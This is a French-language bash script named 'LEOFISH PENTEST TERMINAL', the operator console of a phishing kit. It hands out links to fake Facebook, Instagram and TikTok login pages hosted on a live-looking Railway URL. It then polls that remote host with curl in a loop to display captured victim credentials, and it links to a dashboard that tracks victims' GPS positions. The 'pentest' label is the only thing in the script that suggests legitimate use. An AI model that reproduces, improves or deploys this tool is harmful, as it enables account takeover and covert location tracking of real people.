#!/bin/bash
# ══════════════════════════════════════════
#         LEOFISH PENTEST TERMINAL v1.1
# ══════════════════════════════════════════

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Fichiers
CREDIT_FILE="credit.text"
HELP_FILE="help.text"

# URL Render/Railway
APP_URL="https://leofish-tool-v10-production.up.railway.app"

# Créer dossier sessions
mkdir -p sessions

# ══════════════════════════════════════════
# BANNIÈRE
# ══════════════════════════════════════════
show_banner() {
    clear
    echo -e "${CYAN}"
    if [ -f "$CREDIT_FILE" ]; then
        cat "$CREDIT_FILE"
    fi
    echo -e "${NC}"
    echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║${YELLOW}               LEOFISH TERMINAL v1.1 + GPS           ${WHITE}║${NC}"
    echo -e "${WHITE}║${GREEN}                  Victim → Hacker GPS Tracking        ${WHITE}║${NC}"
    echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ══════════════════════════════════════════
# GÉNÉRER LIEN + MONITORING
# ══════════════════════════════════════════
generate_campaign() {
    show_banner
    echo -e "${PURPLE}🎯 NOUVELLE CAMPAGNE DE PHISH + GPS${NC}"
    echo ""

    echo -e "${WHITE}Choisissez la plateforme :${NC}"
    echo -e "  ${GREEN}1)${NC} Facebook"
    echo -e "  ${GREEN}2)${NC} Instagram" 
    echo -e "  ${GREEN}3)${NC} TikTok"
    echo -e "  ${GREEN}4)${NC} GPS Dashboard"
    echo ""
    read -rp "$(echo -e "${WHITE}Choix (1-4) : ${NC}")" platform_choice

    case $platform_choice in
        1) PLATFORM="facebook"; PAGE="index.php" ;;
        2) PLATFORM="instagram"; PAGE="instagramlogin.php" ;;
        3) PLATFORM="tiktok"; PAGE="tiktoklogin.php" ;;
        4) 
          echo -e "${GREEN}🛰️ GPS DASHBOARD: ${CYAN}${APP_URL}/ps-dashbord.php${NC}"
            echo -e "${YELLOW}📍 Carte satellite live avec toutes positions GPS${NC}"
            read -rp "$(echo -e "${WHITE}Entrée pour continuer...${NC}")"
            return
            ;;
        *) echo -e "${RED}❌ Choix invalide${NC}"; sleep 2; return ;;
    esac

    # Wake up server
    echo -e "${YELLOW}⚡ Wake up server...${NC}"
    curl -s "$APP_URL" > /dev/null

    # Session ID
    SESSION_ID=$(date +%s)_$(openssl rand -hex 4 2>/dev/null || echo $RANDOM)
    PHISH_LINK="${APP_URL}/${PAGE}"

    # Log session
    SESSION_LOG="sessions/${SESSION_ID}_${PLATFORM}.log"
    echo "=== LEOFISH $(date) - $PLATFORM ===" > "$SESSION_LOG"
    echo "Lien: $PHISH_LINK" >> "$SESSION_LOG"

    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║${WHITE}  🎣 LIEN PHISH ($PLATFORM) :                           ${GREEN}║${NC}"
    echo -e "${GREEN}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║  ${CYAN}${PHISH_LINK}${NC}"
    echo -e "${GREEN}║${NC}"
    echo -e "${GREEN}║${WHITE}  🛰️ GPS LIVE MAP : ${CYAN}${APP_URL}/gps.php              ${GREEN}║${NC}"
    echo -e "${GREEN}║${NC}"
    echo -e "${GREEN}║${WHITE}  📺 TERMINAL WEB: ${CYAN}${APP_URL}/terminal.php         ${GREEN}║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"

    echo ""
    read -rp "$(echo -e "${WHITE}Appuie Entrée pour monitoring live...${NC}")"
    
    monitor_logs "$SESSION_ID" "$SESSION_LOG"
}

# ══════════════════════════════════════════
# MONITORING LIVE
# ══════════════════════════════════════════
monitor_logs() {
    local session_id=$1
    local session_log=$2
    
    while true; do
        clear
        show_banner
        echo -e "${RED}👁️  LIVE MONITORING${NC} — ${CYAN}${session_id}${NC}"
        echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
        echo -e "${BLUE}📡 GPS Dashboard:${CYAN} ${APP_URL}/gps.php ${NC} | 📺 Terminal:${CYAN} ${APP_URL}/terminal.php${NC}"
        echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
        echo ""

        # Live creds
        if curl -s --max-time 5 "${APP_URL}/creds.txt" > /tmp/creds_live; then
            cat /tmp/creds_live
        else
            echo -e "${YELLOW}⏳ Attente victimes...${NC}"
        fi

        echo ""
        echo -ne "${GREEN}[LIVE]${NC} "
        read -t 3 -n 1
        if [ $? -eq 0 ]; then
            break
        fi
    done
}

# ══════════════════════════════════════════
# SESSIONS + DASHBOARDS
# ══════════════════════════════════════════
show_sessions() {
    show_banner
    echo -e "${YELLOW}📂 SESSIONS + DASHBOARDS${NC}"
    echo ""
    echo -e "${CYAN}🔗 LIENS LIVE:${NC}"
    echo -e "  📱 Facebook:    ${APP_URL}/index.php"
    echo -e "  📸 Instagram:   ${APP_URL}/instagramlogin.php" 
    echo -e "  🎵 TikTok:      ${APP_URL}/tiktoklogin.php"
    echo -e "  🛰️  GPS Map:     ${APP_URL}/gps.php ${GREEN}(SATELLITE HD)${NC}"
    echo -e "  📺 Terminal:    ${APP_URL}/terminal.php"
    echo ""
    
    if [ -d "sessions" ] && [ "$(ls -A sessions)" ]; then
        echo -e "${YELLOW}📁 Sessions locales:${NC}"
        ls -la sessions/ | tail -n +2
    fi
    
    echo ""
    read -rp "$(echo -e "${WHITE}Entrée...${NC}")"
}

show_help() {
    show_banner
    echo -e "${YELLOW}🎣 LEOFISH GPS PRO${NC}"
    echo -e "${WHITE}══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}1. Génère lien phish → Victim clique → GPS + creds capturés${NC}"
    echo -e "${GREEN}2. GPS.php = Carte satellite HD avec markers live${NC}"
    echo -e "${GREEN}3. Terminal.php = Logs ASCII en temps réel${NC}"
    echo -e "${GREEN}4. Auto-refresh 5s sur tous dashboards${NC}"
    echo ""
    read -rp "$(echo -e "${WHITE}Entrée...${NC}")"
}

# ══════════════════════════════════════════
# MAIN MENU
# ══════════════════════════════════════════
main_menu() {
    while true; do
        show_banner
        echo -e "  ${GREEN}1${NC} ${CYAN}🎣${NC} Nouvelle campagne phish"
        echo -e "  ${GREEN}2${NC} ${CYAN}📂${NC} Sessions + Dashboards live"
        echo -e "  ${GREEN}3${NC} ${CYAN}📖${NC} Aide GPS Pro"
        echo -e "  ${GREEN}0${NC} ${RED}❌${NC} Quitter"
        echo ""
        read -rp "LEOFISH ▶ " choice

        case $choice in
            1) generate_campaign ;;
            2) show_sessions ;;
            3) show_help ;;
            0) echo -e "${GREEN}👋 À bientôt hacker!${NC}"; exit 0 ;;
            *) echo -e "${RED}❌ Mauvais choix${NC}"; sleep 1 ;;
        esac
    done
}

# START
if [ ! -f "$CREDIT_FILE" ]; then
    echo -e "${RED}❌ credit.text manquant${NC}"
    exit 1
fi

main_menu
